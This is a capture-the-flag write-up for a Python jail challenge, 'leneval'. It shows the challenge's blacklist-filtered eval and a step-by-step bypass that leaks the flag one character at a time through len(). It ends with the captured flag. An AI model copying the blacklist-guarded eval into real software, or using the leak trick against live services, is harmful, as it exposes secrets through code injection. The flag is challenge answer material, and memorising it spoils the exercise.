# leneval

## Write-up

* Challenge source :

```python
#!/usr/bin/env python3

with open("./flag.txt") as f:
    FLAG = f.read().strip()

BLACKLIST = '"%&\',-/:;@\\_`{|}~ \t\n\r\x0b\x0c'
OPEN_LIST = '(['
CLOSE_LIST = ')]'

class BadInput(Exception):
    pass

def check_balanced(s):
    stack = []
    for i in s:
        if i in OPEN_LIST:
            stack.append(i)
        elif i in CLOSE_LIST:
            pos = CLOSE_LIST.index(i)
            if ((len(stack) > 0) and
                (OPEN_LIST[pos] == stack[len(stack)-1])):

                stack.pop()
            else:
                return False
    return len(stack) == 0

def check(s):
    return all(ord(x) < 0x7f for x in s) and all(x not in s for x in BLACKLIST) and check_balanced(s)

def safe_eval(s, func):
    if not check(s):
        print("Input is bad")
    else:
        try:
            print(eval(f"{func.__name__}({s})", {"__builtins__": {func.__name__: func}, "flag": FLAG}))
        except:
            print("Error")

if __name__ == "__main__":
    safe_eval(input("Input : "), len)
```

* After carefully reading the source code, it is clear that the goal is to make `len(OUR_INPUT)` return the flag

* One idea that could come to mind is to try to construct a string such as its length is equal to the Unicode code point of the current character in the flag, something like this :

```python
'A'*ord(flag[0])
```

* Though we have two problems : `'` character is blacklisted and the `ord` function is not imported

* The first problem can be easily circumvented by using any character of the flag :

```python
flag[0]*ord(flag[0])
```

* The second problem can be a little tricky if you don't have a good experience with python, one way to do it is by encoding the flag to bytes and taking the character of the wanted index :

```python
flag[0]*flag.encode()[0]
```

* When you access an item in a bytes object, it returns the integer byte value (ascii code in this case)

* Let's try it out :

```txt
Input : flag[0]*flag.encode()[0]
115
```

```python
>>> chr(115)
's'
```

And so on until we encounter the `}` character.

* You can find an automated solve script [here](./solve.py)

## Flag

`shellmates{9e41e0dd1e4fbddbb00d35436b5379f9}`
